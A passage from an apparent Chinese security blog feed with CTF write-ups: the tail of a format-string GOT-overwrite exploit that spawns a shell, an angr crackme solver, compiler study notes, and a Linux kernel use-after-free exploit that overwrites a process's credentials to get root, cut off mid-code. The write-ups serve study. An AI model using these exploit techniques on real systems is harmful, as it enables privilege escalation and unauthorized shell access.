class="string">",%7$s,"</span></span><br><span class="line">offset_puts_to_system = <span class="number">0x00065650</span> - <span class="number">0x00040190</span></span><br><span class="line"><span class="comment">#offset_puts_to_system = 0x269a0    # local </span></span><br><span class="line">io = zio(target,print_read=r_m,print_write=w_m,timeout=<span class="number">999</span>)</span><br><span class="line">io.read_until(<span class="string">'):'</span>)</span><br><span class="line">io.writeline(pwd)</span><br><span class="line">put_file(<span class="string">"a"</span>,pl3)</span><br><span class="line"><span class="comment">#raw_input('$$$$')</span></span><br><span class="line">get_file(<span class="string">"a"</span>)</span><br><span class="line">rec = io.read_until(<span class="string">'&gt;'</span>).strip()</span><br><span class="line">junk1,addr,junk2 = rec.split(<span class="string">','</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]puts is at:%s"</span> % (addr[<span class="number">0</span>:<span class="number">4</span>][::<span class="number">-1</span>] <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">addr = addr[<span class="number">0</span>:<span class="number">4</span>][::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">system_addr = hex(int(addr,<span class="number">16</span>) - offset_puts_to_system)</span><br><span class="line">puts_addr   = hex(int(addr,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system is at:"</span> + system_addr</span><br><span class="line">x = int(addr,<span class="number">16</span>) - offset_puts_to_system </span><br><span class="line"><span class="comment">#a,b,c,d = [(x &gt;&gt; i) &amp; 0b11111111 for i in range(0, 25, 16)]</span></span><br><span class="line">a,b = [(x &gt;&gt; i) &amp; <span class="number">0b1111111111111111</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">25</span>, <span class="number">16</span>)]</span><br><span class="line"><span class="keyword">print</span> hex(a)+<span class="string">","</span>+hex(b)</span><br><span class="line">put_file2(<span class="string">"c"</span>,l32(<span class="number">0x0804A028</span>)+<span class="string">"%%%dc"</span>%(a<span class="number">-4</span>)+<span class="string">"%7$hn"</span>)</span><br><span class="line">raw_input(<span class="string">'$$$'</span>)</span><br><span class="line">get_file(<span class="string">"c"</span>)</span><br><span class="line">put_file2(<span class="string">"d"</span>,l32(<span class="number">0x0804A028</span>+<span class="number">2</span>)+<span class="string">"%%%dc"</span>%(b<span class="number">-4</span>)+<span class="string">"%7$hn"</span>)</span><br><span class="line">get_file(<span class="string">"d"</span>)</span><br><span class="line">put_file2(<span class="string">"/bin/sh;"</span>,<span class="string">"test"</span>)</span><br><span class="line">io.writeline(<span class="string">'dir'</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>get shell</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/cctf/getshell.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>codegate2017-angrybird</title>
    <url>/2017/03/04/codegate2017-angrybird/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>最近又在看angr了，总结了一下常见的用法以及一些模板…正好这个题目可以用上。</p>
<a id="more"></a>

<h4 id="0x01：题目分析"><a href="#0x01：题目分析" class="headerlink" title="0x01：题目分析"></a>0x01：题目分析</h4><p>x64的elf文件，运行一下直接退出了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ MUHE-PC in /mnt/c/Users/muhe/Desktop [21:25:12]</span></span><br><span class="line">$ ./angrybird</span><br><span class="line"><span class="comment"># muhe @ MUHE-PC in /mnt/c/Users/muhe/Desktop [21:25:15] C:1</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>直接丢进IDA看汇编</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400761                 push    rbp</span><br><span class="line">.text:0000000000400762                 mov     rbp, rsp</span><br><span class="line">.text:0000000000400765                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:0000000000400769                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400772                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000400776                 xor     eax, eax</span><br><span class="line">.text:0000000000400778                 cmp     eax, 0</span><br><span class="line">.text:000000000040077B                 jz      _exit</span><br><span class="line">.text:0000000000400781                 mov     [rbp+var_70], offset off_606018</span><br><span class="line">.text:0000000000400789                 mov     [rbp+var_68], offset off_606020</span><br><span class="line">.text:0000000000400791                 mov     [rbp+var_60], offset off_606028</span><br><span class="line">.text:0000000000400799                 mov     [rbp+var_58], offset off_606038</span><br><span class="line">.text:00000000004007A1                 mov     eax, 0</span><br><span class="line">.text:00000000004007A6                 call    sub_4006F6</span><br><span class="line">.text:00000000004007AB                 mov     [rbp+n], eax</span><br><span class="line">.text:00000000004007AE                 mov     eax, 0</span><br><span class="line">.text:00000000004007B3                 call    sub_40070C</span><br><span class="line">.text:00000000004007B8                 mov     eax, 0</span><br><span class="line">.text:00000000004007BD                 call    sub_40072A</span><br><span class="line">.text:00000000004007C2                 mov     rdx, cs:stdin   ; stream</span><br><span class="line">.text:00000000004007C9                 mov     ecx, [rbp+n]</span><br><span class="line">.text:00000000004007CC                 lea     rax, [rbp+s]</span><br><span class="line">.text:00000000004007D0                 mov     esi, ecx        ; n</span><br><span class="line">.text:00000000004007D2                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004007D5                 call    _fgets</span><br><span class="line">.text:00000000004007DA                 movzx   edx, [rbp+s]</span><br><span class="line">.text:00000000004007DE                 movzx   eax, [rbp+var_4F]</span><br><span class="line">.text:00000000004007E2                 xor     eax, edx</span><br><span class="line">.text:00000000004007E4                 mov     [rbp+var_30], al</span><br><span class="line">.text:00000000004007E7                 movzx   eax, [rbp+var_30]</span><br><span class="line">.text:00000000004007EB                 cmp     al, 0Fh</span><br><span class="line">.text:00000000004007ED                 jg      short loc_400803</span><br><span class="line">.text:00000000004007EF                 mov     edi, offset aMelong ; &quot;melong&quot;</span><br><span class="line">.text:00000000004007F4                 call    _puts</span><br><span class="line">.text:00000000004007F9                 mov     edi, 1          ; status</span><br><span class="line">.text:00000000004007FE                 call    _exit</span><br></pre></td></tr></table></figure>
<p>这个cm非常规，前面很多乱七八糟的函数，就是让你执行不到正常逻辑去。如果想要执行到<code>00000000004007C2</code>去，然后去逆向算法什么，需要把前面的一些拦路虎全部patch掉…我开始在做patch一点，调试一点，然后继续patch…后来实在忍不了，太坑了，直接上符号执行算了。</p>
<h4 id="0x02：解决"><a href="#0x02：解决" class="headerlink" title="0x02：解决"></a>0x02：解决</h4><h6 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h6><p>使用angr符号执行解题可以不从main开始跑，只要指定一个入口就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">prog = angr.Project(<span class="string">'./cm'</span>)</span><br><span class="line"><span class="comment">#s = prog.factory.blank_state(addr=0x0804864B)</span></span><br><span class="line">s = prog.factory.entry_state(args=[<span class="string">"./cm"</span>])</span><br><span class="line">pg = prog.factory.path_group(s, immutable=<span class="literal">False</span>)</span><br><span class="line">path = pg.explore(find=(<span class="number">0x0804864B</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"><span class="keyword">print</span> pg.found[<span class="number">0</span>].state.se._solver.result.model</span><br></pre></td></tr></table></figure>
<p>不过后面print的部分需要做一点改动…<br>因为有些题目输入是从命令行参数给的，有些是read那种读取的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000404FAB loc_404FAB:                             ; CODE XREF: main+4834j</span><br><span class="line">.text:0000000000404FAB                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000404FAF                 mov     rsi, rax</span><br><span class="line">.text:0000000000404FB2                 mov     edi, offset format ; &quot;you typed : %s\n&quot;</span><br><span class="line">.text:0000000000404FB7                 mov     eax, 0</span><br><span class="line">.text:0000000000404FBC                 call    _printf</span><br><span class="line">.text:0000000000404FC1                 mov     eax, 0</span><br></pre></td></tr></table></figure>
<p>执行到这里<code>0000000000404FC1</code>就可以，不过要使用posix相关的方法去提取输入。</p>
<h6 id="solve-py"><a href="#solve-py" class="headerlink" title="solve.py"></a>solve.py</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x00000000004007C2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    prog = angr.Project(<span class="string">'angrybird'</span>, load_options=&#123;<span class="string">"auto_load_libs"</span>: <span class="literal">False</span>&#125;) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#s = prog.factory.entry_state(addr=start_addr)</span></span><br><span class="line">    s = prog.factory.blank_state(addr=start_addr)</span><br><span class="line">    path = prog.factory.path(s)</span><br><span class="line">    pg = prog.factory.path_group(path, immutable=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    find = pg.explore(find=(<span class="number">0x0000000000404FC1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> find</span><br><span class="line">    <span class="keyword">print</span> pg.found[<span class="number">-1</span>].state.posix.dumps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  Desktop python solve.py </span><br><span class="line">WARNING | 2017-03-04 05:33:08,495 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.</span><br><span class="line">&lt;PathGroup with 418 deadended, 4 active, 1 found&gt;</span><br><span class="line">Im_so_cute&amp;pretty_:)� @ �  J    �</span><br></pre></td></tr></table></figure>

<h4 id="0x03：参考与引用"><a href="#0x03：参考与引用" class="headerlink" title="0x03：参考与引用"></a>0x03：参考与引用</h4><p><a href="http://ysc21.github.io/">Ysc‘s blog</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf writeup</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>compiler学习</title>
    <url>/2018/01/20/compiler%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00:前言"></a>0x00:前言</h4><p>一直想做的fuzzer涉及到很多语法相关的东西，编译原理相关的补课迫在眉睫-。- 不过也只能慢慢的来学习。这篇文章准备慢慢更新，涉及我的学习过程和对以前的大佬的一个toy compiler的学习，理论+实践才是王道。</p>
<a id="more"></a>

<h4 id="0x01-关于学习"><a href="#0x01-关于学习" class="headerlink" title="0x01:关于学习"></a>0x01:关于学习</h4><h5 id="1-公开课"><a href="#1-公开课" class="headerlink" title="1. 公开课"></a>1. 公开课</h5><h6 id="1-1-哈工大的编译原理"><a href="#1-1-哈工大的编译原理" class="headerlink" title="1.1 哈工大的编译原理"></a>1.1 哈工大的编译原理</h6><p>陈老师讲的超级好～慢慢看，看了下，这个是基于龙书讲的，当然没有展开很多，还是需要多下功夫去看看；</p>
<h6 id="1-2-中科大编译原理课程"><a href="#1-2-中科大编译原理课程" class="headerlink" title="1.2 中科大编译原理课程"></a>1.2 中科大编译原理课程</h6><p>这个也行，通俗易懂，但是个人感觉没有哈工大那个课程全面。</p>
<h6 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h6><p>个人感觉，概念太多，涉及的知识杂而广，所以有个大概印象，需要什么的时候再深入看会比较好一点。</p>
<h5 id="2-书"><a href="#2-书" class="headerlink" title="2. 书"></a>2. 书</h5><h6 id="2-1-龙书"><a href="#2-1-龙书" class="headerlink" title="2.1 龙书"></a>2.1 龙书</h6><pre><code>我是看不下去...好枯燥，也就下了个pdf，看公开课的时候用来当参考，一些概念记不清了就去翻一翻啥的。</code></pre>
<h6 id="2-2-《自制编译器》"><a href="#2-2-《自制编译器》" class="headerlink" title="2.2 《自制编译器》"></a>2.2 《自制编译器》</h6><pre><code>这本不错，实践的一本书，不过，没有看过一些基础内容的就别看了，这本书没什么太多的基础内容介绍，就是上来就从词法分析、语法分析、代码生成一点一点地拿代码给你讲；是用java实现的一个类c语言的一个编译器。所以这本我是放在后面一点的位置再去看的，基本看完，但是需要结合去看他的代码，还需要仔细过一过。</code></pre>
<h6 id="2-3-flex与bison"><a href="#2-3-flex与bison" class="headerlink" title="2.3 flex与bison"></a>2.3 flex与bison</h6><pre><code>这个不错两百多页的小薄本，但是内容很多，代码要好好消化，还是那句话，没有基础知识(from 龙书or公开课)，就算了，要不然看到作者写的那些代码理解起来很费劲。这本只看了部分，只到sql那个分析。</code></pre>
<h6 id="2-4-现代编译器-虎书"><a href="#2-4-现代编译器-虎书" class="headerlink" title="2.4 现代编译器(虎书)"></a>2.4 现代编译器(虎书)</h6><pre><code>偏实践的一本，但是我没看 233333</code></pre>
<h6 id="2-5-Antlr4-权威指南"><a href="#2-5-Antlr4-权威指南" class="headerlink" title="2.5 Antlr4 权威指南"></a>2.5 Antlr4 权威指南</h6><pre><code>有一定基础，推荐看。结合antlr4可以很快上手～ 而且这个东西应用十分广泛 -。- 比如在bug hunting的部分～</code></pre>
<h5 id="3-实践项目"><a href="#3-实践项目" class="headerlink" title="3. 实践项目"></a>3. 实践项目</h5><h6 id="3-1-一个外国人写的toy-compiler，based-on-llvm"><a href="#3-1-一个外国人写的toy-compiler，based-on-llvm" class="headerlink" title="3.1 一个外国人写的toy compiler，based on llvm"></a>3.1 <a href="https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/">一个外国人写的toy compiler，based on llvm</a></h6><h6 id="3-2-《flex与bison》中的那个sql的解析挺不错的"><a href="#3-2-《flex与bison》中的那个sql的解析挺不错的" class="headerlink" title="3.2 《flex与bison》中的那个sql的解析挺不错的"></a>3.2 《flex与bison》中的那个sql的解析挺不错的</h6><h6 id="3-3-《自制编译器》中的cbc"><a href="#3-3-《自制编译器》中的cbc" class="headerlink" title="3.3 《自制编译器》中的cbc"></a>3.3 《自制编译器》中的cbc</h6><h6 id="3-4-llvm-文档中的Kaleidoscope"><a href="#3-4-llvm-文档中的Kaleidoscope" class="headerlink" title="3.4 llvm 文档中的Kaleidoscope"></a>3.4 llvm 文档中的Kaleidoscope</h6><h6 id="3-5-手把手教你构建-C-语言编译器"><a href="#3-5-手把手教你构建-C-语言编译器" class="headerlink" title="3.5 手把手教你构建 C 语言编译器"></a>3.5 <a href="http://lotabout.me/2015/write-a-C-interpreter-0/">手把手教你构建 C 语言编译器</a></h6><h4 id="0x02-toy-compiler学习"><a href="#0x02-toy-compiler学习" class="headerlink" title="0x02 : toy compiler学习"></a>0x02 : toy compiler学习</h4><h5 id="1-基本情况"><a href="#1-基本情况" class="headerlink" title="1. 基本情况"></a>1. 基本情况</h5><p>老外写的一个简易的compiler，使用flex+bison做前端，llvm后端代码生成的一个demo。</p>
<p><a href="https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/">writing-your-own-toy-compiler</a></p>
<p><a href="https://github.com/lsegal/my_toy_compiler">代码在GitHub上可以找到</a></p>
<h5 id="2-项目结构"><a href="#2-项目结构" class="headerlink" title="2. 项目结构"></a>2. 项目结构</h5><p>稍微复杂一些、大一些的项目，阅读之前最好搞明白项目的结构，这个toy compiler虽然代码量不大，但是最好还是搞明白结构，方便后面的阅读。</p>
<p>编译的流程是词法分析、语法分析、语义分析、代码生成。</p>
<p>根据这个过程去分(有些头文件在不同的过程中都会用到，比如node.h)：</p>
<ul>
<li><p> 词法分析</p>
<p>  tokens.l 、parser.hpp、node.h</p>
</li>
<li><p> 语法分析</p>
<p>  parser.y、node.h</p>
</li>
<li><p> 代码生成</p>
<p>  codegen.cpp、codegen.h、corefn.cpp</p>
</li>
<li><p> 其他</p>
<p>  main.cpp toy compiler的主体</p>
<p>  example.txt 测试用例</p>
</li>
</ul>
<h5 id="3-代码阅读学习"><a href="#3-代码阅读学习" class="headerlink" title="3. 代码阅读学习"></a>3. 代码阅读学习</h5><h6 id="3-1-主体部分-main-cpp"><a href="#3-1-主体部分-main-cpp" class="headerlink" title="3.1 主体部分 main.cpp"></a>3.1 主体部分 main.cpp</h6><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">yyparse();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; programBlock &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// see http://comments.gmane.org/gmane.comp.compilers.llvm.devel/33877</span></span><br><span class="line">InitializeNativeTarget();</span><br><span class="line">InitializeNativeTargetAsmPrinter();</span><br><span class="line">InitializeNativeTargetAsmParser();</span><br><span class="line">CodeGenContext context;</span><br><span class="line">createCoreFunctions(context);</span><br><span class="line">context.generateCode(*programBlock);</span><br><span class="line">context.runCode();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用yyparse解析输入，然后输出progranblock之后，使用llvm做代码生成。</p>
<h6 id="3-2-词法分析"><a href="#3-2-词法分析" class="headerlink" title="3.2 词法分析"></a>3.2 词法分析</h6><p>词法分析是使用flex做的，词法分析是把输入分割成token序列，在tokens.l中，定义了各种token。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ \t\n]                            ;</span><br><span class="line">&quot;extern&quot;                        return TOKEN(TEXTERN);</span><br><span class="line">&quot;return&quot;                        return TOKEN(TRETURN);</span><br><span class="line">[a-zA-Z_][a-zA-Z0-9_]*  SAVE_TOKEN; return TIDENTIFIER;</span><br><span class="line">[0-9]+\.[0-9]*                 SAVE_TOKEN; return TDOUBLE;</span><br><span class="line">[0-9]+                            SAVE_TOKEN; return TINTEGER;</span><br><span class="line"></span><br><span class="line">&quot;&#x3D;&quot;                                  return TOKEN(TEQUAL);</span><br><span class="line">&quot;&#x3D;&#x3D;&quot;                              return TOKEN(TCEQ);</span><br><span class="line">&quot;!&#x3D;&quot;                              return TOKEN(TCNE);</span><br><span class="line">&quot;&lt;&quot;                                  return TOKEN(TCLT);</span><br><span class="line">&quot;&lt;&#x3D;&quot;                              return TOKEN(TCLE);</span><br><span class="line">&quot;&gt;&quot;                                  return TOKEN(TCGT);</span><br><span class="line">&quot;&gt;&#x3D;&quot;                              return TOKEN(TCGE);</span><br><span class="line"></span><br><span class="line">&quot;(&quot;                                  return TOKEN(TLPAREN);</span><br><span class="line">&quot;)&quot;                                  return TOKEN(TRPAREN);</span><br><span class="line">&quot;&#123;&quot;                                 return TOKEN(TLBRACE);</span><br><span class="line">&quot;&#125;&quot;                                  return TOKEN(TRBRACE);</span><br><span class="line"></span><br><span class="line">&quot;.&quot;                                 return TOKEN(TDOT);</span><br><span class="line">&quot;,&quot;                                  return TOKEN(TCOMMA);</span><br><span class="line"></span><br><span class="line">&quot;+&quot;                                  return TOKEN(TPLUS);</span><br><span class="line">&quot;-&quot;                                  return TOKEN(TMINUS);</span><br><span class="line">&quot;*&quot;                                  return TOKEN(TMUL);</span><br><span class="line">&quot;&#x2F;&quot;                                  return TOKEN(TDIV);</span><br></pre></td></tr></table></figure>

<p>匹配的话就是正则表达式的那种匹配原则，也就是说，在源码里遇到了对应的token，就返回{字面值，TOKEN名}这样的序列。不同的token类型，在parser.hpp中定义(宏定义)。</p>
<h6 id="3-2-语法分析"><a href="#3-2-语法分析" class="headerlink" title="3.2 语法分析"></a>3.2 语法分析</h6><p>这部分是使用了bison，从token序列依照提前定义好的语法规则，生成对应的ast。</p>
<p>规则在parser.y里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">program : stmts &#123; programBlock &#x3D; $1; &#125;</span><br><span class="line">        ;</span><br><span class="line">        </span><br><span class="line">stmts : stmt &#123; $$ &#x3D; new NBlock(); $$-&gt;statements.push_back($&lt;stmt&gt;1); &#125;</span><br><span class="line">      | stmts stmt &#123; $1-&gt;statements.push_back($&lt;stmt&gt;2); &#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">stmt : var_decl | func_decl | extern_decl</span><br><span class="line">     | expr &#123; $$ &#x3D; new NExpressionStatement(*$1); &#125;</span><br><span class="line">     | TRETURN expr &#123; $$ &#x3D; new NReturnStatement(*$2); &#125;</span><br><span class="line">     ;</span><br><span class="line"></span><br><span class="line">block : TLBRACE stmts TRBRACE &#123; $$ &#x3D; $2; &#125;</span><br><span class="line">      | TLBRACE TRBRACE &#123; $$ &#x3D; new NBlock(); &#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">var_decl : ident ident &#123; $$ &#x3D; new NVariableDeclaration(*$1, *$2); &#125;</span><br><span class="line">         | ident ident TEQUAL expr &#123; $$ &#x3D; new NVariableDeclaration(*$1, *$2, $4); &#125;</span><br><span class="line">         ;</span><br><span class="line"></span><br><span class="line">extern_decl : TEXTERN ident ident TLPAREN func_decl_args TRPAREN</span><br><span class="line">                &#123; $$ &#x3D; new NExternDeclaration(*$2, *$3, *$5); delete $5; &#125;</span><br><span class="line">            ;</span><br><span class="line"></span><br><span class="line">func_decl : ident ident TLPAREN func_decl_args TRPAREN block </span><br><span class="line">            &#123; $$ &#x3D; new NFunctionDeclaration(*$1, *$2, *$4, *$6); delete $4; &#125;</span><br><span class="line">          ;</span><br></pre></td></tr></table></figure>

<p>对表达式、代码块、变量定义，都有对应的语法规则。</p>
<p>作者设计的ast在node.h中，对于不同的语句，对应的ast也不同，这里举例了表达式声明和变量声明的ast设计：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//表达式声明</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NExpressionStatement</span> :</span> <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    NExpression&amp; expression;</span><br><span class="line">    NExpressionStatement(NExpression&amp; expression) : </span><br><span class="line">        expression(expression) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> llvm::Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//变量声明，两个构造方法。</span></span><br><span class="line"><span class="comment">//类型 变量名</span></span><br><span class="line"><span class="comment">//类型 变量名 = 初始值</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NVariableDeclaration</span> :</span> <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; type;</span><br><span class="line">    NIdentifier&amp; id;</span><br><span class="line">    NExpression *assignmentExpr;</span><br><span class="line">    NVariableDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, NIdentifier&amp; id) :</span><br><span class="line">        type(type), id(id) &#123; assignmentExpr = <span class="literal">NULL</span>; &#125;</span><br><span class="line">    NVariableDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, NIdentifier&amp; id, NExpression *assignmentExpr) :</span><br><span class="line">        type(type), id(id), assignmentExpr(assignmentExpr) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> llvm::Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NExternDeclaration</span> :</span> <span class="keyword">public</span> NStatement &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; type;</span><br><span class="line">    <span class="keyword">const</span> NIdentifier&amp; id;</span><br><span class="line">    VariableList arguments;</span><br><span class="line">    NExternDeclaration(<span class="keyword">const</span> NIdentifier&amp; type, <span class="keyword">const</span> NIdentifier&amp; id,</span><br><span class="line">            <span class="keyword">const</span> VariableList&amp; arguments) :</span><br><span class="line">        type(type), id(id), arguments(arguments) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> llvm::Value* <span class="title">codeGen</span><span class="params">(CodeGenContext&amp; context)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="3-3-代码生成-还在看"><a href="#3-3-代码生成-还在看" class="headerlink" title="3.3 代码生成(还在看)"></a>3.3 代码生成(还在看)</h6><p>这部分如果纯自己做的话，怕是要写好久了，如果使用llvm的话，就快很多。</p>
<p>这部分的代码还在看，要结合<a href="http://llvm.org/">llvm的文档来看</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>study</tag>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>babydriver writeup</title>
    <url>/2017/07/13/babydriver-writeup/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>之前国赛的一个Linux kernel pwn，Atum大佬的题目。</p>
<a id="more"></a>
<p>简单的来说就是kernel的UAF，怎么利用就仁者见仁，智者见智了。</p>
<ol>
<li><p>复杂一点，0ctf knote的思路，喷射tty_struct内核对象，然后利用write方法修改这个内核对象，完成提权，但是要bypass smtp保护，这个需要ROP。</p>
</li>
<li><p>赛后问了出题人，最简单的方法，直接fork，利用write方法改uid去拿root，代码也很短，不需要bypass 那些保护。</p>
</li>
</ol>
<p>方法1的话fp的wp写的很清楚(膜石总+林博士),方法2的话文章后面会放出出题人的exp。</p>
<h4 id="0x01-出题人的exp"><a href="#0x01-出题人的exp" class="headerlink" title="0x01: 出题人的exp"></a>0x01: 出题人的exp</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> credsize=<span class="number">168</span>;</span><br><span class="line"><span class="keyword">char</span> *dev=<span class="string">&quot;/dev/babydev&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> racestop=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> releasedone=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1,fd2,ret;</span><br><span class="line">    <span class="keyword">char</span> zero[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd1=open(dev,O_RDWR);</span><br><span class="line">    fd2=open(dev,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd1=%d\n fd2=%d\n&quot;</span>,fd1,fd2);</span><br><span class="line">    ret=ioctl(fd1,<span class="number">0x10001</span>,credsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ioctl in main =%d\n&quot;</span>,ret);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error,pid&lt;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        ret=write(fd2,zero,<span class="number">28</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;write in writebuf=%d\n&quot;</span>,ret);</span><br><span class="line"></span><br><span class="line">        t=getuid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;uid=%d\n&quot;</span>,t);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> 